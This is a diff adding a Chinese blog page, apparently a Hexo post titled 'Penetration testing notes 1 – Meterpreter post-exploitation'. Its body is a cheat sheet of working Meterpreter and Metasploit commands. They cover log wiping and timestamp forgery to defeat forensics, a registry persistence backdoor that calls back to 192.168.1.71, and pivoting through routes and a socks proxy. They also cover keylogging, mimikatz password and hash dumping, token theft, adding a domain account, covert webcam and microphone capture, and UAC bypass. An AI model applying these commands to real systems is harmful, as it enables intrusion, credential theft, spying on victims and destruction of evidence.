@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="metasploit,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="tusk1'Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="基本命令background将meterpreter终端隐藏在后台,msf可执行其它任务. sessions查看已获取的会话,sessions -i 与某对话交互 quit关闭当前会话,返回msf终端 shell获取系统的控制台shell reboot重新启动受害人的计算机 irb与ruby终端交互,可以直接调用metasploit封装好的函数,如:   client.sys.config.sys">
+<meta name="keywords" content="metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试笔记1-Meterpreter后渗透">
+<meta property="og:url" content="http://yoursite.com/2019/10/03/渗透测试笔记1-Meterpreter后渗透/index.html">
+<meta property="og:site_name" content="tusk1&#39;Blog">
+<meta property="og:description" content="基本命令background将meterpreter终端隐藏在后台,msf可执行其它任务. sessions查看已获取的会话,sessions -i 与某对话交互 quit关闭当前会话,返回msf终端 shell获取系统的控制台shell reboot重新启动受害人的计算机 irb与ruby终端交互,可以直接调用metasploit封装好的函数,如:   client.sys.config.sys">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-10-03T08:01:26.927Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透测试笔记1-Meterpreter后渗透">
+<meta name="twitter:description" content="基本命令background将meterpreter终端隐藏在后台,msf可执行其它任务. sessions查看已获取的会话,sessions -i 与某对话交互 quit关闭当前会话,返回msf终端 shell获取系统的控制台shell reboot重新启动受害人的计算机 irb与ruby终端交互,可以直接调用metasploit封装好的函数,如:   client.sys.config.sys">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/03/渗透测试笔记1-Meterpreter后渗透/">
+
+
+
+
+
+  <title>渗透测试笔记1-Meterpreter后渗透 | tusk1'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">tusk1'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/03/渗透测试笔记1-Meterpreter后渗透/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="tusk1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tusk1'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">渗透测试笔记1-Meterpreter后渗透</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-03T15:58:35+08:00">
+                2019-10-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h4 id="background"><a href="#background" class="headerlink" title="background"></a>background</h4><p>将meterpreter终端隐藏在后台,msf可执行其它任务.</p>
+<h4 id="sessions"><a href="#sessions" class="headerlink" title="sessions"></a>sessions</h4><p>查看已获取的会话,sessions -i 与某对话交互</p>
+<h4 id="quit"><a href="#quit" class="headerlink" title="quit"></a>quit</h4><p>关闭当前会话,返回msf终端</p>
+<h4 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h4><p>获取系统的控制台shell</p>
+<h4 id="reboot"><a href="#reboot" class="headerlink" title="reboot"></a>reboot</h4><p>重新启动受害人的计算机</p>
+<h4 id="irb"><a href="#irb" class="headerlink" title="irb"></a>irb</h4><p>与ruby终端交互,可以直接调用metasploit封装好的函数,如:</p>
+<blockquote>
+<blockquote>
+<p>client.sys.config.sysinfo()  </p>
+</blockquote>
+</blockquote>
+<p>添加metasploit的附加组件-Railgun,直接与windows api交互,命令:</p>
+<blockquote>
+<blockquote>
+<p>client.core.use(“railgun”)<br>client.railgun.user32.MessageBox(0,”hello word!”,null,MB_OK)</p>
+</blockquote>
+</blockquote>
+<h4 id="clearev-clearav"><a href="#clearev-clearav" class="headerlink" title="clearev/clearav"></a>clearev/clearav</h4><p>清除目标系统的事件日志</p>
+<h4 id="idletime"><a href="#idletime" class="headerlink" title="idletime"></a>idletime</h4><p>显示目标机器截止到当前无操作命令的时间</p>
+<h4 id="基于MACE时间的反电子取证"><a href="#基于MACE时间的反电子取证" class="headerlink" title="基于MACE时间的反电子取证"></a>基于MACE时间的反电子取证</h4><p>timestomp -v secist.txt  #查看当前目标文件 MACE 时间<br>timestomp c:/a.doc -c “10/27/2015 14:22:11” #修改文件的创建时间，例如修改文件的创建时间（反取证调查）<br>timestomp -f c:\AVScanner.ini secist.txt （将模板文件MACE时间，复制给当前文件）</p>
+<h2 id="文件命令"><a href="#文件命令" class="headerlink" title="文件命令"></a>文件命令</h2><h4 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h4><p>查看文件,注意双斜杠转义,如: </p>
+<blockquote>
+<blockquote>
+<p>cat c:\boot.ini  </p>
+</blockquote>
+</blockquote>
+<h4 id="getwd"><a href="#getwd" class="headerlink" title="getwd"></a>getwd</h4><p>获取目标机上当前的工作目录</p>
+<h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><p>上传文件到目标机:</p>
+<blockquote>
+<blockquote>
+<p>upload net.exe c:\</p>
+</blockquote>
+</blockquote>
+<h4 id="download"><a href="#download" class="headerlink" title="download"></a>download</h4><p>下载文件:</p>
+<blockquote>
+<blockquote>
+<p>download xxx.txt /tmp</p>
+</blockquote>
+</blockquote>
+<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p>调用vim编辑文件,如编辑hosts文件</p>
+<h4 id="search"><a href="#search" class="headerlink" title="search"></a>search</h4><p>搜索文件</p>
+<h2 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h2><h4 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h4><p>获取网络接口信息</p>
+<h4 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h4><p>端口转发</p>
+<blockquote>
+<blockquote>
+<p>portfwd add -l 1234 -p 3389 -r 192.168.10.142</p>
+</blockquote>
+</blockquote>
+<p>然后使用kali的rdesktop命令连接本地的1234端口,与远程主机的3389端口建立连接:</p>
+<blockquote>
+<blockquote>
+<p>rdesktop -u admin -p 1234 127.0.0.1:1234</p>
+</blockquote>
+</blockquote>
+<h4 id="route"><a href="#route" class="headerlink" title="route"></a>route</h4><p>显示目标主机的路由信息</p>
+<h4 id="run-get-local-subnets"><a href="#run-get-local-subnets" class="headerlink" title="run get_local_subnets"></a>run get_local_subnets</h4><p>查看已拿下的目标主机的内网IP段情况</p>
+<h4 id="添加一条通向目标服务器内网的路由"><a href="#添加一条通向目标服务器内网的路由" class="headerlink" title="添加一条通向目标服务器内网的路由"></a>添加一条通向目标服务器内网的路由</h4><p>查看shell网络环境：</p>
+<blockquote>
+<blockquote>
+<p>meterpreter&gt;run get_local_subnets</p>
+</blockquote>
+</blockquote>
+<p>添加一条通向目标服务器内网的路由</p>
+<blockquote>
+<blockquote>
+<p>meterpreter&gt;run autoroute -s 100.0.0.0/8   #(根据目标内网网络而定)</p>
+</blockquote>
+</blockquote>
+<p>查看路由设置：</p>
+<blockquote>
+<blockquote>
+<p>meterpreter&gt;run autoroute –p</p>
+</blockquote>
+</blockquote>
+<p>一般来说，在meterpreter中设置路由便可以达到通往其内网的目的。然而有些时候还是会失败，这时我们可以background返回msf&gt;，查看下外面的路由情况。</p>
+<blockquote>
+<blockquote>
+<p>route print</p>
+</blockquote>
+</blockquote>
+<p>如果发现没有路由信息，说明meterpreter shell设置的路由并没有生效，我们可以在msf中添加路由。</p>
+<blockquote>
+<blockquote>
+<p>msf&gt;route add 10.0.0.0 255.0.0.0 1</p>
+</blockquote>
+</blockquote>
+<p>说明：1表示session 1，攻击机如果要去访问10.0.0.0/8网段的资源，其下一跳是session1，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。</p>
+<h4 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h4><p>msf exploit(handler) &gt; use auxiliary/server/socks4a</p>
+<p>msf auxiliary(socks4a) &gt; route print</p>
+<p>msf auxiliary(socks4a) &gt; ifconfig</p>
+<p>msf auxiliary(socks4a) &gt; set SRVHOST xxx.xxx.xx.xx #xxx.xxx.xx.xx为自己运行msf的vps机子’</p>
+<p>msf auxiliary(socks4a) &gt; exploit  </p>
+<p>proxychains nmap 192.168.1.0/24</p>
+<h2 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h2><h4 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h4><p>查看进程信息</p>
+<h4 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a>migrate</h4><p>将meterpreter移植到另一进程空间中,如:migrate 304</p>
+<h4 id="execute"><a href="#execute" class="headerlink" title="execute"></a>execute</h4><p>在目标机上执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute</span><br><span class="line">Usage: execute -f file [options]</span><br><span class="line">Executes a command on the remote machine.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -H        Create the process hidden from view.</span><br><span class="line">    -a &lt;opt&gt;  The arguments to pass to the command.</span><br><span class="line">    -c        Channelized I/O (required for interaction).</span><br><span class="line">    -d &lt;opt&gt;  The &apos;dummy&apos; executable to launch when using -m.</span><br><span class="line">    -f &lt;opt&gt;  The executable command to run.</span><br><span class="line">    -h        Help menu.</span><br><span class="line">    -i        Interact with the process after creating it.</span><br><span class="line">    -k        Execute process on the meterpreters current desktop</span><br><span class="line">    -m        Execute from memory.</span><br><span class="line">    -s &lt;opt&gt;  Execute process in a given session as the session user</span><br><span class="line">    -t        Execute process with currently impersonated thread token</span><br></pre></td></tr></table></figure></p>
+<p>例:</p>
+<blockquote>
+<blockquote>
+<p>execute -H -f cmd.exe  隐藏执行cmd.exe<br>execute -H -i -f cmd.exe  与cmd进行交互</p>
+</blockquote>
+</blockquote>
+<p>-m参数直接在内存中执行,不易留下痕迹</p>
+<h4 id="getpid"><a href="#getpid" class="headerlink" title="getpid"></a>getpid</h4><p>获取当前会话进程的PID值</p>
+<h4 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h4><p>终结指定的进程</p>
+<h4 id="getuid"><a href="#getuid" class="headerlink" title="getuid"></a>getuid</h4><p>查看当前的用户名,从而查看会话具有的权限</p>
+<h4 id="sysinfo"><a href="#sysinfo" class="headerlink" title="sysinfo"></a>sysinfo</h4><p>获取目标系统的信息</p>
+<h4 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h4><p>关闭目标主机</p>
+<h2 id="植入后门"><a href="#植入后门" class="headerlink" title="植入后门"></a>植入后门</h2><h4 id="persistence"><a href="#persistence" class="headerlink" title="persistence"></a>persistence</h4><p>向注册表中注入键值,维持权限</p>
+<blockquote>
+<blockquote>
+<p>run persistence -U -i 5 -p 443 -r 192.168.1.71</p>
+</blockquote>
+</blockquote>
+<h4 id="metsvc"><a href="#metsvc" class="headerlink" title="metsvc"></a>metsvc</h4><p>以系统服务形式安装到主机</p>
+<h4 id="getgui"><a href="#getgui" class="headerlink" title="getgui"></a>getgui</h4><p>开启远程桌面</p>
+<blockquote>
+<blockquote>
+<p>run getgui -u xxxxx -p xxxxxx</p>
+</blockquote>
+</blockquote>
+<p>开启3389端口</p>
+<blockquote>
+<blockquote>
+<p>run getgui -e</p>
+</blockquote>
+</blockquote>
+<h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><h4 id="getsystem-命令"><a href="#getsystem-命令" class="headerlink" title="getsystem 命令"></a>getsystem 命令</h4><p>提权:ms09-012\ms10-015</p>
+<h4 id="ms10-073-ms10-092"><a href="#ms10-073-ms10-092" class="headerlink" title="ms10-073\ms10-092"></a>ms10-073\ms10-092</h4><h2 id="键盘监听"><a href="#键盘监听" class="headerlink" title="键盘监听"></a>键盘监听</h2><p>Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：</p>
+<p>keyscan_start：开启键盘记录功能</p>
+<p>keyscan_dump：显示捕捉到的键盘记录信息</p>
+<p>keyscan_stop：停止键盘记录功能</p>
+<p>uictl enable keyboard/mouse#接管目标主机的键盘和鼠标。</p>
+<p>meterpreter &gt; keyscan_start #针对远程目标主机开启键盘记录功能</p>
+<p>Starting the keystroke sniffer…</p>
+<p>meterpreter &gt; keyscan_dump #存储目标主机上捕获的键盘记录</p>
+<p>meterpreter &gt; keyscan_stop #停止针对目标主机的键盘记录</p>
+<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><p>meterpreter &gt; load mimikatz  #加载mimikatz</p>
+<p>meterpreter &gt; msv #获取hash值</p>
+<p>meterpreter &gt; kerberos #获取明文</p>
+<p>meterpreter &gt;ssp   #获取明文信息</p>
+<p>meterpreter &gt; wdigest #获取系统账户信息</p>
+<p>meterpreter &gt; mimikatz_command -f a:: #输入一个错误的模块，可以列出所有模块</p>
+<p>meterpreter &gt; mimikatz_command -f samdump:: #可以列出samdump的子命令</p>
+<p>meterpreter &gt; mimikatz_command -f samdump::hashe  #获取目标 hash</p>
+<p>meterpreter &gt; mimikatz_command -f handle::list #列出应用进程</p>
+<p>meterpreter &gt; mimikatz_command -f service::list #列出服务</p>
+<h2 id="网络嗅探"><a href="#网络嗅探" class="headerlink" title="网络嗅探"></a>网络嗅探</h2><p>meterpreter &gt; use sniffer # 加载嗅探模块</p>
+<p>meterpreter &gt; sniffer_interfaces #列出目标主机所有开放的网络接口</p>
+<p>meterpreter &gt; sniffer_start ID #获取正在实施嗅探网络接口的统计数据</p>
+<p>meterpreter &gt; sniffer_dump ID FILEPATH #在目标主机上针对特定范围的数据包缓冲区启动嗅探</p>
+<p>meterpreter &gt; sniffer_stop ID   #停止嗅探</p>
+<p>对抓取的包进行解包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/sniffer/psnuffle</span><br><span class="line">set pcapfile 1.cap</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<h2 id="捕捉屏幕"><a href="#捕捉屏幕" class="headerlink" title="捕捉屏幕"></a>捕捉屏幕</h2><p>screenshot  #屏幕截图并存储在我们的系统之中</p>
+<p>run vnc     #弹出窗口，在此窗口中就是对方现在打开的桌面情况，在这里，可以对远程机器进行操控</p>
+<h2 id="盗取令牌"><a href="#盗取令牌" class="headerlink" title="盗取令牌"></a>盗取令牌</h2><p>meterpreter &gt;use incognito    加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)</p>
+<p>meterpreter &gt;list_tokens -u    列出目标主机用户的可用令牌</p>
+<p>meterpreter &gt;list_tokens -g    列出目标主机用户组的可用令牌</p>
+<p>meterpreter &gt;impersonate_token DOMAIN_NAME\USERNAME    假冒目标主机上的可用令牌,如meterpreter &gt; impersonate_token QLWEB\Administrato</p>
+<p>meterpreter &gt;execute -f cmd.exe -i -t #调用域权限shell</p>
+<p>meterpreter &gt; getuid</p>
+<p>meterpreter&gt;add_user 0xfa funny –h192.168.3.98  #在域控主机上添加账户</p>
+<p>meterpreter&gt;reg command   # 在目标主机注册表中进行交互，创建，删除，查询等操作</p>
+<p>meterpreter&gt;setdesktop number   #切换到另一个用户界面（该功能基于哪些用户已登录）</p>
+<p>meterpreter&gt;ps #查看目标机器进程，找出域控账户运行的进程ID</p>
+<p>meterpreter&gt;steal_token pid #盗窃给定进行的可用令牌并进行令牌假冒</p>
+<p>meterpreter&gt;drop_token pid #停止假冒当前令牌</p>
+<h2 id="网络摄像头"><a href="#网络摄像头" class="headerlink" title="网络摄像头"></a>网络摄像头</h2><p>record_mic　　　 #音频录制</p>
+<p>webcam_chat　　　#查看摄像头接口</p>
+<p>webcam_list　　　#查看摄像头列表</p>
+<p>webcam_stream　　#摄像头视频获取</p>
+<p>webcam_snap      #抓取目标主机当前的摄像头拍摄到的画面，并将它以图片形式保存到本地</p>
+<h2 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h2><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><blockquote>
+<blockquote>
+<p>use auxiliary/scanner/portscan/tcp</p>
+</blockquote>
+</blockquote>
+<h4 id="存活主机扫描"><a href="#存活主机扫描" class="headerlink" title="存活主机扫描"></a>存活主机扫描</h4><blockquote>
+<blockquote>
+<p>run  arp_scanner -r 192.168.1.0/24</p>
+</blockquote>
+</blockquote>
+<h2 id="绕过UAC"><a href="#绕过UAC" class="headerlink" title="绕过UAC"></a>绕过UAC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf&gt;use exploit/windows/local/ask</span><br><span class="line"></span><br><span class="line">msf&gt;show options</span><br><span class="line"></span><br><span class="line">msf&gt;set session 1</span><br><span class="line"></span><br><span class="line">msf&gt;exploit</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/metasploit/" rel="tag"># metasploit</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/12/DeDecms-v5-7-sp2-CRSF-文件操作-前台getshell/" rel="next" title="DeDecms v5.7 sp2 CRSF+文件操作 前台getshell">
+                <i class="fa fa-chevron-left"></i> DeDecms v5.7 sp2 CRSF+文件操作 前台getshell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/03/渗透测试笔记2-MSF常用模块记录/" rel="prev" title="渗透测试笔记2-MSF常用模块记录">
+                渗透测试笔记2-MSF常用模块记录 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="tusk1">
+            
+              <p class="site-author-name" itemprop="name">tusk1</p>
+              <p class="site-description motion-element" itemprop="description">奋斗、寻觅，而不屈服</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=1592129863&website=www.oicqzone.com" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-globe"></i>QQ</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:tusk1@foxmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本命令"><span class="nav-number">1.</span> <span class="nav-text">基本命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#background"><span class="nav-number">1.0.1.</span> <span class="nav-text">background</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sessions"><span class="nav-number">1.0.2.</span> <span class="nav-text">sessions</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#quit"><span class="nav-number">1.0.3.</span> <span class="nav-text">quit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shell"><span class="nav-number">1.0.4.</span> <span class="nav-text">shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#reboot"><span class="nav-number">1.0.5.</span> <span class="nav-text">reboot</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#irb"><span class="nav-number">1.0.6.</span> <span class="nav-text">irb</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#clearev-clearav"><span class="nav-number">1.0.7.</span> <span class="nav-text">clearev/clearav</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#idletime"><span class="nav-number">1.0.8.</span> <span class="nav-text">idletime</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于MACE时间的反电子取证"><span class="nav-number">1.0.9.</span> <span class="nav-text">基于MACE时间的反电子取证</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#文件命令"><span class="nav-number">2.</span> <span class="nav-text">文件命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cat"><span class="nav-number">2.0.1.</span> <span class="nav-text">cat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getwd"><span class="nav-number">2.0.2.</span> <span class="nav-text">getwd</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#upload"><span class="nav-number">2.0.3.</span> <span class="nav-text">upload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#download"><span class="nav-number">2.0.4.</span> <span class="nav-text">download</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#edit"><span class="nav-number">2.0.5.</span> <span class="nav-text">edit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#search"><span class="nav-number">2.0.6.</span> <span class="nav-text">search</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络命令"><span class="nav-number">3.</span> <span class="nav-text">网络命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ipconfig"><span class="nav-number">3.0.1.</span> <span class="nav-text">ipconfig</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#portfwd"><span class="nav-number">3.0.2.</span> <span class="nav-text">portfwd</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#route"><span class="nav-number">3.0.3.</span> <span class="nav-text">route</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#run-get-local-subnets"><span class="nav-number">3.0.4.</span> <span class="nav-text">run get_local_subnets</span></a></li><li class="nav-item nav-level-4"><a 